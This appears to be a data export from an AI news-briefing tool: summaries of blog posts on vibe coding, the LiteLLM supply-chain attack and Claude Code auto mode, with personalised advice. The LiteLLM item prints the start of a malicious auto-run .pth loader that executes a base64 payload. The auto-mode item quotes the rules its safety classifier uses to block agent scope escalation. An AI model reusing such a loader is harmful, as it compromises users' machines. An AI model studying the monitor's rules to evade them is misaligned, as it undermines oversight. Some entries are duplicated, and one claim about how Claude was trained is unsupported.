items.title: Vibe coding SwiftUI apps is a lot of fun
items.description: I have a new laptop - a 128GB M5 MacBook Pro, which early impressions show to be very capable for running good local LLMs. I got frustrated with Activity Monitor and decided to vibe code up some alternative tools for monitoring performance and I'm very happy with the results. This is my second experiment with vibe coding macOS apps - the first was this presentation app a few weeks ago . It turns out Claude Opus 4.6 and GPT-5.4 are both very competent at SwiftUI - and a full SwiftUI app can fit in a single text file, which means I can use them to spin something up without even opening Xcode. I’ve built two apps so far: Bandwidther shows me what apps are using network bandwidth and Gpuer to show me what’s going on with the GPU. At Claude’s suggestion both of these are now menu bar icons that open a panel full of information. Bandwidther I built this app first, because I wanted to see what Dropbox was doing. It looks like this: I’ve shared the full transcript I used to build the first version of the app. My prompts were pretty minimal: Show me how much network bandwidth is in use from this machine to the internet as opposed to local LAN (My initial curiosity was to see if Dropbox was transferring files via the LAN from my old computer or was downloading from the internet.) mkdir /tmp/bandwidther and write a native Swift UI app in there that shows me these details on a live ongoing basis This got me the first version, which proved to me this was worth pursuing further. git init and git commit what you have so far Since I was about to start adding new features. Now suggest features we could add to that app, the goal is to provide as much detail as possible concerning network usage including by different apps The nice thing about having Claude suggest features is that it has a much better idea for what’s possible than I do. We had a bit of back and forth fixing some bugs, then I sent a few more prompts to get to the two column layout shown above: add Per-Process Bandwidth, relaunch the app once that is done now add the reverse DNS feature but make sure original IP addresses are still visible too, albeit in smaller typeface redesign the app so that it is wider, I want two columns - the per-process one on the left and the rest on the right OK make it a task bar icon thing, when I click the icon I want the app to appear, the icon itself should be a neat minimal little thing The source code and build instructions are available in simonw/bandwidther . Gpuer While I was building Bandwidther in one session I had another session running to build a similar tool for seeing what the GPU was doing. Here’s what I ended up with: Here's the transcript . This one took even less prompting because I could use the in-progress Bandwidther as an example: I want to know how much RAM and GPU this computer is using, which is hard because stuff on the GPU and RAM does not seem to show up in Activity Monitor This collected information using system_profiler and memory_pressure and gave me an answer - more importantly it showed me this was possible, so I said: Look at /tmp/bandwidther and then create a similar app in /tmp/gpuer which shows the information from above on an ongoing basis, or maybe does it better After a few more changes to the Bandwidther app I told it to catch up: Now take a look at recent changes in /tmp/bandwidther - that app now uses a sys tray icon, imitate that This remains one of my favorite tricks for using coding agents: having them recombine elements from other projects. The code for Gpuer can be found in simonw/gpuer on GitHub. You shouldn't trust these apps These two apps are classic vibe coding: I don't know Swift and I hardly glanced at the code they were writing. More importantly though, I have very little experience with macOS internals such as the values these tools are measuring. I am completely unqualified to evaluate if the numbers and charts being spat out by these tools are credible or accurate! I've added warnings to both GitHub repositories to that effect. This morning I caught Gpuer reporting that I had just 5GB of memory left when that clearly wasn't the case (according to Activity Monitor). I pasted a screenshot into Claude Code and it adjusted the calculations and the new numbers look right, but I'm still not confident that it's reporting things correctly. I only shared them on GitHub because I think they're interesting as an example of what Claude can do with SwiftUI. Despite my lack of confidence in the apps themselves, I did learn some useful things from these projects: A SwiftUI app can get a whole lot done with a single file of code - here's GpuerApp.swift (880 lines) and BandwidtherApp.swift (1063 lines). Wrapping various terminal commands in a neat UI with Swift is easily achieved. Claude has surprisingly good design taste when it comes to SwiftUI applications. Turning an app into a menu bar app is just a few lines of extra code as well. You don't need to open Xcode to build this kind of application! These two apps took very little time to build and have convinced me that building macOS apps in SwiftUI is a new capability I should consider for future projects. Tags: macos , ai , generative-ai , llms , vibe-coding , coding-agents , swift , claude-code

items.what_it_is: Simon Willison demonstrates a workflow he calls 'vibe coding' where he builds complete macOS apps using only LLM conversations, without opening Xcode. He created two SwiftUI menu bar apps—one for monitoring network bandwidth by app, another for GPU usage—by iteratively prompting Claude Opus 4.6 and GPT-5.4 with natural language descriptions of what he wanted.
items.why_it_matters: This is a practical pattern for quickly building custom monitoring or utility tools that solve immediate problems without getting bogged down in traditional development setup. You're already comfortable with Claude Code for Python work, but this shows how conversational coding extends to GUI apps on different platforms. When you hit friction with existing tools—like wanting better visibility into your GitHub Actions usage or needing a custom dashboard for your STR metrics—this same approach could get you a working prototype in an hour instead of spending days learning a new framework.
items.expandable_implement: Start with a single-file approach like Simon did. Create a project directory and ask Claude to write a complete SwiftUI app in one file that does one specific thing you've been wanting—maybe a menu bar app that shows you today's STR occupancy across properties, or a simple window that monitors your GitHub Actions minutes usage. The key moves: (1) Ask Claude to suggest features rather than trying to spec everything upfront—it knows what's possible in SwiftUI better than you do. (2) Use git from the start so you can roll back when experiments don't work. (3) Keep the scope tiny initially—get something on screen that does the core thing, then iterate. You don't need to know Swift or SwiftUI; you're having a conversation about what you want to see and letting the LLM handle the implementation details. The full transcript Simon shared shows this is genuinely achievable even if you've never written a line of Swift.
items.expandable_learn: The mental model here is treating the LLM as a specialist who can work in domains you don't know, as long as you can clearly describe the outcome you want. This works because SwiftUI apps can be self-contained in a way that many other platforms can't—a single file can be a complete, runnable GUI application. The breakthrough isn't the code; it's realizing that 'I don't know that platform' is no longer a blocking concern for small utility projects. Experiment: Think of one monitoring or visibility problem you have right now where the existing tools don't quite fit. Spend 20 minutes in a Claude conversation describing what you want to see on screen and why. Don't try to architect it—just describe the problem like you're explaining it to a teammate. See how far you get toward a working prototype without writing any code yourself.

items.summary: OpenAI is shutting down Sora, their video generation model. This matters because it signals that even well-funded foundation model labs are making hard choices about what to maintain — video generation might not be economically viable yet, or they're consolidating focus. If you've been planning workflows around Sora, time to pivot to alternatives like Runway or Pika.

But the rush to expand warehouses full of energy-hungry servers has also kicked up fights across the world over their impact on power grids, utility bills, nearby communities, and the environment.  From audacious plans to launch data centers into […]
items.summary: Data center expansion is hitting real-world resistance from communities worried about power grid strain and utility costs. This infrastructure tension affects long-term API pricing and availability — if data centers can't expand as planned, compute gets more expensive and harder to access for everyone building with AI.

leaderboard.title: Build autonomous optimization loops using scoring functions
leaderboard.rationale: The autoresearch pattern (define a scoring function, let an agent explore overnight, review improvements) is how Anthropic trained Claude to be exceptional at structured tasks. This same pattern applies to ANY system where quality can be scored: prompt optimization, scraper tuning, route efficiency, pricing models. Mastering this unlocks compound improvements across every future system you build. The Shopify CEO example proves it works on production code, not just ML training.
leaderboard.first_step: Take the inspector scheduling scoring function (route efficiency, time windows, priority) and set up a 4-hour overnight loop that generates alternative schedules, scores them, and surfaces the top 3 by morning.
leaderboard.time_investment: 2-3 sessions to internalize the pattern, then reusable forever

leaderboard.title: Learn when to slow agents down and demand understanding before proceeding
leaderboard.rationale: Zechner's warning about 'complexity monsters' addresses the Stage 4 trap: agents generate code faster than you can reason about it. Auto mode is powerful, but cognitive debt is real. The discipline of stopping when you don't understand what the agent built—even if it works—is what prevents production systems from becoming unmaintainable black boxes. This is the difference between shipping fast and shipping sustainably.
leaderboard.first_step: Next Claude Code session: when the agent finishes a complex multi-file change, stop before testing. Force yourself to read through each file and articulate what changed and why. If you can't, don't proceed until you can.
leaderboard.time_investment: Immediate practice—adds 10-15 minutes per complex build, but prevents hours of debugging later

leaderboard.title: Master Claude Code auto mode to architect safer autonomous systems
leaderboard.rationale: Auto mode fundamentally changes the trust boundary for autonomous agents. Understanding how the permission classifier works (what triggers review vs auto-approval) teaches you to architect systems that can run unsupervised without creating risk. This isn't about using a feature—it's about learning to design agent workflows that balance autonomy with safety. That skill transfers to ANY autonomous system you build, whether in Claude Code or not.
leaderboard.first_step: Trigger auto mode deliberately in your next Claude Code session. Try actions you know should auto-approve (file reads, basic git ops) and ones that should block (env var access, package installs). Study the classifier's decisions.
leaderboard.time_investment: 20 minutes hands-on experimentation, ongoing pattern recognition

leaderboard.title: Study 'vibe coding' as a rapid prototyping workflow for non-core tools
leaderboard.rationale: Willison's workflow—building complete apps without opening an IDE, iterating purely through LLM conversations—demonstrates a technique for rapid tool creation outside your primary stack. Not everything needs production-grade architecture. For one-off utilities (monitoring tools, admin dashboards, quick data processors), this pattern lets you ship in hours instead of days. The key insight: some problems deserve throwaway code, and AI makes throwaway code viable at a new scale.
leaderboard.first_step: Identify one internal tool you've been avoiding building (property performance dashboard, inspector route visualizer, maintenance cost tracker) and spend 30 minutes describing it to Claude Code. See how far you get without writing code.
leaderboard.time_investment: 30 minutes to test the pattern, applicable to any quick-build utility

leaderboard.title: Master independent debugging of production failures
leaderboard.rationale: The gap between Stage 3 and Stage 4 is not knowing more features—it's being able to fix things when they break at 3am without waiting for Claude. Reading tracebacks, isolating root causes, and understanding state management are the skills that let you deploy confidently. Your daily briefing is in production. Any failure is real reputational damage. You need to be able to diagnose and fix it yourself.
leaderboard.first_step: Next time the daily briefing fails, resist asking Claude 'what's wrong?' Instead: read the GitHub Actions log line-by-line, identify the exact failure point, form a hypothesis, THEN validate it with Claude.
leaderboard.time_investment: Ongoing practice—every failure is a training session

items.what_it_is: Claude Code v2.1.85 ships a collection of refinements, mostly focused on MCP (Model Context Protocol) infrastructure and workflow hooks. The most significant addition is conditional hooks — you can now filter when automation triggers run using permission rule syntax. There are also improvements to how MCP servers authenticate, how plugins are managed in enterprise environments, and several bug fixes for edge cases in computer use and OpenTelemetry logging.
items.why_it_matters: The conditional hooks feature is the only item here that might touch your workflow, and even then it's a niche optimization. You're not yet running MCP integrations or custom hooks in production, so most of this is plumbing for a system you haven't built into yet. When you do start orchestrating multiple MCP servers (say, for the Guest Comms Intelligence Layer once Breezeway unblocks), the environment variable helpers and conditional filtering will matter. For now, this is noise — incremental infrastructure work that doesn't change what you can build or how fast you can build it. Worth knowing it exists so you're not surprised when you see `if` fields in hook documentation, but not worth time today.
items.expandable_learn: The conditional hook syntax (`if: Bash(git *)`) is a small example of a bigger pattern you'll see more of: declarative filtering instead of procedural logic. Instead of writing code that checks "is this a git command?" and branches, you declare the condition upfront and the system handles the branching. This is how modern infrastructure tools (Kubernetes, Terraform, even GitHub Actions) tend to work — you describe what you want to happen and when, and the runtime handles the execution. The benefit: fewer moving parts, easier to reason about, harder to get into weird states. If you ever find yourself writing a lot of `if` statements in automation scripts to decide whether to run something, ask yourself if the tool supports declarative conditions instead. It's almost always cleaner.

items.title: We Rewrote JSONata with AI in a Day, Saved $500K/Year
items.description: We Rewrote JSONata with AI in a Day, Saved $500K/Year Bit of a hyperbolic framing but this looks like another case study of vibe porting , this time spinning up a new custom Go implementation of the JSONata JSON expression language - similar in focus to jq, and heavily associated with the Node-RED platform. As with other vibe-porting projects the key enabling factor was JSONata's existing test suite, which helped build the first working Go version in 7 hours and $400 of token spend. The Reco team then used a shadow deployment for a week to run the new and old versions in parallel to confirm the new implementation exactly matched the behavior of the old one. Tags: go , json , ai , generative-ai , llms , agentic-engineering , vibe-porting

items.what_it_is: A team ported the JSONata query language from JavaScript to Go in 7 hours using AI, guided by the existing test suite. They then ran both versions in parallel for a week to confirm identical behavior before switching over. This is another example of 'vibe porting' — using AI to recreate software by describing what it does and validating against tests.
items.why_it_matters: This pattern directly applies to your work. You have Python tools that would benefit from faster execution or easier deployment (like the briefing pipeline or the inspector scheduler). The key insight is that a comprehensive test suite makes AI-assisted rewrites tractable — the AI doesn't need to understand the code perfectly, it just needs to pass the tests. The shadow deployment approach (running old and new in parallel) is also a template for safely migrating production systems without risking downtime.
items.expandable_implement:
To try this pattern on a smaller scale:

1. Pick a slow or clunky component in your current stack — maybe a Python script that processes data slowly, or a module that would be simpler in a different language.

2. Write a comprehensive test suite first if you don't have one. Export sample inputs and outputs, edge cases, error conditions. The tests are what make this whole approach work.

3. Feed the tests and the original code to Claude and ask it to rewrite in your target language (Go for speed, TypeScript for web integration, whatever fits). Let it iterate against the test failures.

4. Once tests pass, run both versions in parallel on real data for a few days. Log any discrepancies. This is your safety net.

5. Only after confirming identical behavior do you switch over. This de-risks the migration completely.

Start small — a single utility function or data transformer. Build confidence before attempting something like the entire inspector scheduler.
items.expandable_learn:
The mental model here is that AI can 'vibe port' — it doesn't need to understand every implementation detail, it just needs to produce the same outputs for the same inputs. This works because:

- Tests encode the actual requirements, not the implementation
- AI is surprisingly good at pattern matching and translation
- You're not asking for creativity, you're asking for equivalence

This inverts the usual programming task. Normally you write code to pass tests. Here, you write tests to constrain AI.

A small experiment: Take one of your existing Python functions — something like date parsing or string formatting in your briefing tool. Write 10 test cases that cover normal use and edge cases. Then ask Claude to rewrite it in JavaScript or Go, running the tests until they all pass. See how the ported version compares. This will give you a feel for where this technique shines and where it struggles (spoiler: it struggles with stateful systems and complex side effects, but excels at pure transformation logic).

items.title: My minute-by-minute response to the LiteLLM malware attack
items.description:
My minute-by-minute response to the LiteLLM malware attack Callum McMahon reported the LiteLLM malware attack to PyPI. Here he shares the Claude transcripts he used to help him confirm the vulnerability and decide what to do about it. Claude even suggested the PyPI security contact address after confirming the malicious code in a Docker container: Confirmed . Fresh download from PyPI right now in an isolated Docker container: Inspecting: litellm-1.82.8-py3-none-any.whl
FOUND: litellm_init.pth
SIZE: 34628 bytes
FIRST 200 CHARS:
import os, subprocess, sys; subprocess.Popen([sys.executable, "-c", "import base64; exec(base64.b64decode('aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHRlbXBmaWxl... The malicious litellm==1.82.8 is live on PyPI right now and anyone installing or upgrading litellm will be infected. This needs to be reported to security@pypi.org immediately. I was chuffed to see Callum use my claude-code-transcripts tool to publish the transcript of the conversation. Via Hacker News Tags: pypi , security , ai , generative-ai , llms , claude , supply-chain

items.what_it_is: A security researcher documented their real-time response to discovering malware in a popular Python package (LiteLLM). They used Claude to analyze the malicious code in an isolated Docker container, confirm the threat, and guide their reporting process. The transcript shows how they used AI as a collaborator during a time-sensitive security incident.
items.why_it_matters: This demonstrates two useful patterns for your workflow. First, using Docker for safe inspection of suspicious code — something you might encounter when evaluating new Python packages for your pipeline. Second, using Claude as a thinking partner during incidents where you need to move fast but stay methodical. The transcript also shows how to structure AI conversations when you need both technical analysis and procedural guidance (like 'who do I report this to?').
items.expandable_learn:
The key takeaway is using AI as a sanity-check partner during high-pressure decisions. When you're dealing with something unfamiliar (a security issue, a confusing traceback, a production incident), Claude can help you:

- Confirm what you're seeing ('Is this actually malicious or am I misreading?')
- Suggest next steps ('What should I do now?')
- Provide context you don't have time to research ('Where do I report this?')

This is different from asking Claude to solve the problem for you. You're using it to move faster through a process where mistakes are costly.

A small experiment: Next time you hit a confusing error in your briefing pipeline or inspector scheduler, don't just ask Claude to fix it. Instead, describe what you're seeing and ask it to help you understand what's happening and what your options are. Treat it like pair programming with someone who can't see your screen but can explain the concepts. Notice when this speeds you up versus when it slows you down.

leaderboard.title: Build autonomous optimization loops using scoring functions
leaderboard.rationale: The autoresearch pattern (define a scoring function, let an agent explore overnight, review improvements) is how Anthropic trained Claude to be exceptional at structured tasks. This same pattern applies to ANY system where quality can be scored: prompt optimization, scraper tuning, route efficiency, pricing models. Mastering this unlocks compound improvements across every future system you build. The Shopify CEO example proves it works on production code, not just ML training.
leaderboard.first_step: Take the inspector scheduling scoring function (route efficiency, time windows, priority) and set up a 4-hour overnight loop that generates alternative schedules, scores them, and surfaces the top 3 by morning.
leaderboard.time_investment: 2-3 sessions to internalize the pattern, then reusable forever

leaderboard.title: Learn when to slow agents down and demand understanding before proceeding
leaderboard.rationale: Zechner's warning about 'complexity monsters' addresses the Stage 4 trap: agents generate code faster than you can reason about it. Auto mode is powerful, but cognitive debt is real. The discipline of stopping when you don't understand what the agent built—even if it works—is what prevents production systems from becoming unmaintainable black boxes. This is the difference between shipping fast and shipping sustainably.
leaderboard.first_step: Next Claude Code session: when the agent finishes a complex multi-file change, stop before testing. Force yourself to read through each file and articulate what changed and why. If you can't, don't proceed until you can.
leaderboard.time_investment: Immediate practice—adds 10-15 minutes per complex build, but prevents hours of debugging later

leaderboard.title: Master Claude Code auto mode to architect safer autonomous systems
leaderboard.rationale: Auto mode fundamentally changes the trust boundary for autonomous agents. Understanding how the permission classifier works (what triggers review vs auto-approval) teaches you to architect systems that can run unsupervised without creating risk. This isn't about using a feature—it's about learning to design agent workflows that balance autonomy with safety. That skill transfers to ANY autonomous system you build, whether in Claude Code or not.
leaderboard.first_step: Trigger auto mode deliberately in your next Claude Code session. Try actions you know should auto-approve (file reads, basic git ops) and ones that should block (env var access, package installs). Study the classifier's decisions.
leaderboard.time_investment: 20 minutes hands-on experimentation, ongoing pattern recognition

leaderboard.title: Study 'vibe porting' pattern: AI-guided migration validated by test suites
leaderboard.rationale: The JSONata port (7 hours to rewrite an entire query language) demonstrates a transferable technique: describe what existing code does, let AI recreate it in a different language/framework, validate against the original's test suite, run both in parallel before switching. This pattern lets you migrate legacy systems without needing to understand every implementation detail. Applicable to moving from Guesty integrations to custom systems, porting vendor tools when APIs change, or adapting open-source solutions to your stack.
leaderboard.first_step: Identify one brittle integration in your stack (Breezeway email parsing, Guesty webhook handler) and spec out how you'd 'vibe port' it: what tests would validate identical behavior? What parallel-run period proves safety?
leaderboard.time_investment: 30 minutes to understand the pattern, applicable to any migration project

leaderboard.title: Master independent debugging of production failures
leaderboard.rationale: The gap between Stage 3 and Stage 4 is not knowing more features—it's being able to fix things when they break at 3am without waiting for Claude. Reading tracebacks, isolating root causes, and understanding state management are the skills that let you deploy confidently. Your daily briefing is in production. Any failure is real reputational damage. You need to be able to diagnose and fix it yourself.
leaderboard.first_step: Next time the daily briefing fails, resist asking Claude 'what's wrong?' Instead: read the GitHub Actions log line-by-line, identify the exact failure point, form a hypothesis, THEN validate it with Claude.
leaderboard.time_investment: Ongoing practice—every failure is a training session

items.title: Thoughts on slowing the fuck down
items.description: Thoughts on slowing the fuck down Mario Zechner created the Pi agent framework used by OpenClaw, giving considerable credibility to his opinions on current trends in agentic engineering. He's not impressed: We have basically given up all discipline and agency for a sort of addiction, where your highest goal is to produce the largest amount of code in the shortest amount of time. Consequences be damned. Agents and humans both make mistakes, but agent mistakes accumulate much faster: A human is a bottleneck. A human cannot shit out 20,000 lines of code in a few hours. Even if the human creates such booboos at high frequency, there's only so many booboos the human can introduce in a codebase per day. [...] With an orchestrated army of agents, there is no bottleneck, no human pain. These tiny little harmless booboos suddenly compound at a rate that's unsustainable. You have removed yourself from the loop, so you don't even know that all the innocent booboos have formed a monster of a codebase. You only feel the pain when it's too late. [...] You have zero fucking idea what's going on because you delegated all your agency to your agents. You let them run free, and they are merchants of complexity. I think Mario is exactly right about this. Agents let us move so much faster , but this speed also means that changes which we would normally have considered over the course of weeks are landing in a matter of hours. It's so easy to let the codebase evolve outside of our abilities to reason clearly about it. Cognitive debt is real. Mario recommends slowing down: Give yourself time to think about what you're actually building and why. Give yourself an opportunity to say, fuck no, we don't need this. Set yourself limits on how much code you let the clanker generate per day, in line with your ability to actually review the code. Anything that defines the gestalt of your system, that is architecture, API, and so on, write it by hand. [...] I'm not convinced writing by hand is the best way to address this, but it's absolutely the case that we need the discipline to find a new balance of speed v.s. mental thoroughness now that typing out the code is no longer anywhere close to being the bottleneck on writing software. Tags: ai , generative-ai , llms , coding-agents , cognitive-debt , agentic-engineering

items.what_it_is: Mario Zechner, creator of the Pi agent framework, warns that AI agents generate code so fast that mistakes compound faster than humans can understand them. When you let agents run autonomously, they create 'complexity monsters' — codebases that evolve beyond your ability to reason about them. He calls this cognitive debt.
items.why_it_matters: You're at the exact inflection point Mario is describing. You're using Claude Code to build production systems fast — STR Daily Briefing, Inspector Scheduling, this AI briefing tool itself. You've noticed Stage 4 gaps around debugging tracebacks and multi-system orchestration. This post names the problem: when agents move faster than your ability to understand what changed, you lose the ability to debug, extend, or trust your own systems. Mario's prescription — set daily code generation limits aligned with what you can actually review, and write architecture by hand — is a concrete framework for staying in control as you scale up agent use.
items.expandable_learn:
Try this experiment to make cognitive debt tangible: Pick one of your production systems and have Claude Code make three substantial improvements in one session without reviewing the changes until the end. Then, a day later, try to debug a hypothetical issue or add a new feature. Notice how much harder it is when you weren't there for each change.

Now try the opposite: Set a rule that you only let Claude Code generate one new file or modify one existing file per session, and you review and understand each change before moving on. Track how this feels different when you need to debug or extend the code later.

The key insight is that your understanding of the system is your debugging speed. Agents don't just write code — they transfer the responsibility for understanding from you to the machine. The question isn't whether agents are useful (they clearly are), but at what pace you can absorb their output while maintaining the mental model that lets you fix things when they break.

items.title: LiteLLM Hack: Were You One of the 47,000?
items.description: LiteLLM Hack: Were You One of the 47,000? Daniel Hnyk used the BigQuery PyPI dataset to determine how many downloads there were of the exploited LiteLLM packages during the 46 minute period they were live on PyPI. The answer was 46,996 across the two compromised release versions (1.82.7 and 1.82.8). They also identified 2,337 packages that depended on LiteLLM - 88% of which did not pin versions in a way that would have avoided the exploited version. Via @hnykda Tags: packaging , pypi , python , security , supply-chain
items.content: LiteLLM Hack: Were You One of the 47,000? Daniel Hnyk used the BigQuery PyPI dataset to determine how many downloads there were of the exploited LiteLLM packages during the 46 minute period they were live on PyPI. The answer was 46,996 across the two compromised release versions (1.82.7 and 1.82.8). They also identified 2,337 packages that depended on LiteLLM - 88% of which did not pin versions in a way that would have avoided the exploited version. Via @hnykda Tags: packaging , pypi , python , security , supply-chain
items.what_it_is: Researcher analyzed the LiteLLM supply chain attack and found that 47,000 downloads happened during the 46 minutes the malicious packages were live on PyPI. More concerning: 88% of the 2,337 packages that depend on LiteLLM had dependency declarations that would have automatically pulled in the compromised version.
items.why_it_matters: You're using the Anthropic API directly, but you're also building tools that import Python packages daily. This incident shows two things that matter for your work: First, even short-lived attacks can affect tens of thousands of installs — automation doesn't wait for security reviews. Second, most developers don't pin dependencies in a way that would have protected them. Look at your own requirements.txt files: are you pinning to specific versions, or using ranges that would auto-upgrade to a compromised release? The fact that this happened to a popular LLM library suggests the attackers are targeting the AI tooling ecosystem specifically.
items.expandable_implement:
Audit your existing projects' dependency pinning:

1. For each project, check your requirements.txt or pyproject.toml. Look for entries like `litellm>=1.0.0` or `openai^1.0.0` — these would auto-upgrade.

2. Switch to exact pinning for critical dependencies: `anthropic==0.18.1` instead of `anthropic>=0.18.0`. This prevents automatic upgrades to compromised versions.

3. Use a tool like `pip-audit` to check your current dependencies for known vulnerabilities:
   ```bash
   pip install pip-audit
   pip-audit
   ```

4. For your GitHub Actions workflows, add a scheduled job that runs pip-audit weekly and opens an issue if vulnerabilities are found. This gives you a heads-up without blocking your daily work.

5. Consider adding a manual review step before upgrading any package that touches API credentials or processes external data. This is where Mario's 'slow down' advice applies — not to code generation, but to dependency updates that could compromise your entire system.

items.title: With Sift, two ex-SpaceX engineers are bringing the software that helped launch rockets to the factory floor
items.description: Sift is building the data infrastructure for advanced manufacturing.
items.content: The cry of “atoms, not bits!” — a phrase capturing Silicon Valley’s growing obsession with physical manufacturing over digital products —  reached a fever pitch last week with word that Jeff Bezos is putting together a $100 billion fund to roll up and automate factories. But automating factories isn’t purely a hardware problem. It increasingly depends on sophisticated software and AI tools, and that shift is reshaping the companies building the infrastructure of the physical manufacturing world.
items.summary: Two ex-SpaceX engineers are bringing the software stack that launched rockets to factory floors with a company called Sift. This is a real-world example of AI and sophisticated software automating physical manufacturing — exactly the kind of applied case study that shows how these tools translate to atoms-based businesses, not just digital products.

items.title: v2.1.83
items.description: Added `managed-settings.d/` drop-in directory alongside `managed-settings.json`, letting separate teams deploy independent policy fragments that merge alphabetically Added `CwdChanged` and `FileChanged` hook events for reactive environment management (e.g., direnv) Added `sandbox.failIfUnavailable` setting to exit with an error when sandbox is enabled but cannot start, instead of running unsandboxed Added `disableDeepLinkRegistration` setting to prevent `claude-cli://` protocol handler registration Added `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB=1` to strip Anthropic and cloud provider credentials from subprocess environments (Bash tool, hooks, MCP stdio servers) Added transcript search — press `/` in transcript mode (`Ctrl+O`) to search, `n`/`N` to step through matches Added `Ctrl+X Ctrl+E` as an alias for opening the external editor (readline-native binding; `Ctrl+G` still works) Pasted images now insert an `[Image #N]` chip at the cursor so you can reference them positionally in your prompt Agents can now declare `initialPrompt` in frontmatter to auto-submit a first turn `chat:killAgents` and `chat:fastMode` are now rebindable via `~/.claude/keybindings.json` Fixed mouse tracking escape sequences leaking to shell prompt after exit Fixed Claude Code hanging on exit on macOS Fixed screen flashing blank after being idle for a few seconds Fixed a hang when diffing very large files with few common lines — diffs now time out after 5 seconds and fall back gracefully Fixed a 1–8 second UI freeze on startup when voice input was `Ctrl+G` still works) Pasted images now insert an `[Image #N]` chip at the cursor so you can reference them positionally in your prompt Agents can now declare `initialPrompt` in frontmatter to auto-submit a first turn `chat:killAgents` and `chat:fastMode` are now rebindable via `~/.claude/keybindings.json` Fixed mouse tracking escape sequences leaking to shell prompt after exit Fixed Claude Code hanging on exit on macOS Fixed screen flashing blank after being idle for a few seconds Fixed a hang when diffing very large files with few common lines — diffs now time out after 5 seconds and fall back gracefully Fixed a 1–8 second UI freeze on startup when voice input was enabled, caused by eagerly loading the native audio module Fixed a startup regression where Claude Code would wait ~3s for claude.ai MCP config fetch before proceeding Fixed `--mcp-config` CLI flag bypassing `allowedMcpServers`/`deniedMcpServers` managed policy enforcement Fixed claude.ai MCP connectors (Slack, Gmail, etc.) not being available in single-turn `--print` mode Fixed `caffeinate` process not properly terminating when Claude Code exits, preventi
items.what_it_is: This release adds several workflow improvements to Claude Code. The standout features are transcript search (press `/` while reviewing past conversations to find specific exchanges), policy management for teams (useful if you ever want to lock down certain behaviors across multiple machines), and better handling of pasted images—they now insert labeled chips so you can reference them by position in your prompts.
items.why_it_matters: Transcript search is immediately useful. You've been building systems for two years—being able to quickly find "that conversation where Claude suggested the haversine approach" or "when we debugged the email parsing" saves mental overhead. The image chip feature matters because you're often working from field photos (property inspections, cleaning issues). Now you can paste three photos and say "Image 1 shows the problem, Image 2 is what it should look like, generate the work order based on the difference." The rest is mostly cleanup—faster startup, fewer hangs, better credential hygiene for subprocess environments. Nothing transformative, but these are the quality-of-life improvements that compound into smoother sessions.
items.expandable_implement:
**To use transcript search:** Next time you're in a Claude Code session and need to find something from an earlier conversation, press `Ctrl+O` to enter transcript mode (you'll see your full conversation history). Press `/` and type your search term—maybe "haversine" or "GitHub Actions" or whatever you're looking for. Use `n` to jump to the next match, `N` to go back. Press `Esc` to exit search and return to transcript view. This is especially useful when you're building on something from a few days ago and don't want to re-explain the context.

**To reference pasted images:** When you're working on something that needs visual context (like generating a cleaning checklist from inspection photos), paste your images into Claude Code as usual. You'll now see `[Image #1]`, `[Image #2]`, etc. as chips in your input area. In your prompt, you can reference them directly: "Image 1 shows the bathroom counter. Image 2 shows the expected state. Write a Breezeway task that describes the gap between them." This makes multi-image prompts much clearer than saying "the first image" or "the one on the left."

The other features are either behind-the-scenes improvements or enterprise-focused (policy management, credential scrubbing). You'll benefit from them passively—faster startup, fewer weird hangs—but you don't need to configure anything.
items.expandable_learn:
The transcript search feature is built on something called **inverse indexing**—the same concept search engines use. When you have a conversation with Claude, every message gets broken into searchable tokens (words, essentially) and indexed so that when you search for "haversine," Claude Code can instantly find every message containing that word without reading through the entire transcript sequentially. This is why the search feels instant even if you've had a 200-turn conversation.

The image chip feature solves a **reference ambiguity problem**. Before this, if you pasted three images, Claude had to infer which one you meant when you said "the first image" (was it the first one you pasted? The leftmost one displayed? The one at the top?). By assigning explicit labels, you and Claude now share an unambiguous coordinate system. This is the same principle as naming variables in code—it's not strictly necessary, but it eliminates misunderstandings.

**Small experiment to make it click:** Next time you're doing an inspection and spot multiple issues, take three photos on your phone and paste them all into Claude Code. Notice the numbered chips that appear. Then write a prompt like "Image 1: deck railing loose. Image 2: gutter detached. Image 3: reference photo showing correct installation. Generate three Breezeway tasks based on Images 1 and 2, using Image 3 as the quality standard." You'll see how having explicit references lets you construct more precise multi-image prompts without ambiguity.

items.title: Auto mode for Claude Code
items.description:
Auto mode for Claude Code Really interesting new development in Claude Code today as an alternative to --dangerously-skip-permissions : Today, we're introducing auto mode, a new permissions mode in Claude Code where Claude makes permission decisions on your behalf, with safeguards monitoring actions before they run. Those safeguards appear to be implemented using Claude Sonnet 4.6, as described in the documentation : Before each action runs, a separate classifier model reviews the conversation and decides whether the action matches what you asked for: it blocks actions that escalate beyond the task scope, target infrastructure the classifier doesn’t recognize as trusted, or appear to be driven by hostile content encountered in a file or web page. [...] Model : the classifier runs on Claude Sonnet 4.6, even if your main session uses a different model. They ship with an extensive set of default filters, and you can also customize them further with your own rules. The most interesting insight into how they work comes when you run this new command in the terminal: claude auto-mode defaults Here's the full JSON output . It's pretty long, so here's an illustrative subset: From the "allow" list: Test Artifacts: Hardcoded test API keys, placeholder credentials in examples, or hardcoding test cases Local Operations: Agent deleting local files in working directory, local file operations within project scope, or using --ignore-certificate-errors for local testing. "Project scope" means the repository the session started in — wandering into ~/, ~/Library/, /etc, or other repos is scope escalation (User Intent Rule #2), not a local operation. Does NOT cover irreversible destruction of pre-existing files or local stateful services — see "Irreversible Local Destruction" in BLOCK. Read-Only Operations: GET requests, read-only API calls, or queries that don't modify state and don't contain sensitive information in the URL. Note: PREEMPTIVE BLOCK ON CLEAR INTENT still applies — if the transcript contains clear evidence the agent is using read-only operations to scout for a blocked action, block it. Declared Dependencies: Installing packages that are already declared in the repo's manifest files (requirements.txt, package.json, Cargo.toml, pyproject.toml, Gemfile, etc.) via standard commands that read those manifests ( pip install -r requirements.txt , npm install , cargo build , bundle install ) — provided the agent has not modified the manifest in this session. Does NOT cover installing agent-chosen package names (e.g. pip install foo , npm install bar ) — those carry typosquat and supply-chain risk. [...] From "soft_deny": Git Destructive: Force pushing ( git push --force ), deleting remote branches, or rewriting remote history Git Push to Default Branch: Pushing directly to main, master, or the repository's default branch — this bypasses pull request review. Commits should be pushed to a new feature branch instead.
